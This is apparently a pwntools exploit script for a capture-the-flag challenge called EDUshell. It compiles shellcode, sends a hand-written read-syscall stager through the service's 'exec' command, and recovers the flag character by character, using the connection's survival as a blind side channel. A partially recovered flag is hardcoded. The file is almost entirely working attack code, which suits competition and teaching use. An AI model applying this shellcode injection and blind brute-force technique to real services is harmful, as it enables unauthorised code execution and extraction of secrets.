#!/usr/bin/python3

from pwn import *
import sys
import string
import subprocess

HOST = 'eofqual.zoolab.org'
PORT = 10101
BIN = './EDUshell'
LIBC = '../libc-2.31.so'

e = ELF(BIN)
l = ELF(LIBC)
w = string.printable[:-6]

if len(sys.argv) > 1:
	#r = remote(HOST, PORT)
	r = ''
else:
    r = process(BIN, env={"LD_PRELOAD": LIBC})

subprocess.Popen(['make'])
sleep(0.2)
subprocess.Popen(['objcopy', '-j.text', '-O', 'binary', 'sc.o', 'sc.bin'])
sleep(0.2)
sc = open('sc.bin', 'rb').read()
print(sc)
print(hex(len(sc)))

"""
mov r14, rdx
xor rdi, rdi
xor rdx, rdx
xor rax, rax
lea rsi, [r14+0x15]
add dx, 0xffff
syscall
"""
sc1 = b"\x49\x89\xD6\x48\x31\xFF\x48\x31\xD2\x48\x31\xC0\x49\x8D\x76\x15\x80\xC2\xF0\x0F\x05"

w = '_'+string.digits+string.ascii_letters+'!?}'
FLAG = 'FLAG{5ee_thr0ugh_th3_b1ind3d_3'
while True:
	for j in w:
		r = remote(HOST, PORT)
		r.sendlineafter('EDUSHELL', 'loadflag')
		sleep(0.1)
		r.sendline(b'exec ' + sc1)
		sleep(0.1)
		r.send(sc)
		for i in range(len(FLAG)):
			sleep(0.1)
			r.send(FLAG[i])
		sleep(0.1)
		r.send(j)
		print(j)
		try:
			sleep(0.1)
			r.recvline(timeout=1)
			FLAG += j
			print(FLAG)
			break
		except EOFError:
			if j == w[-1]:
				open('flag.txt', 'w').write(FLAG)
				break
			pass
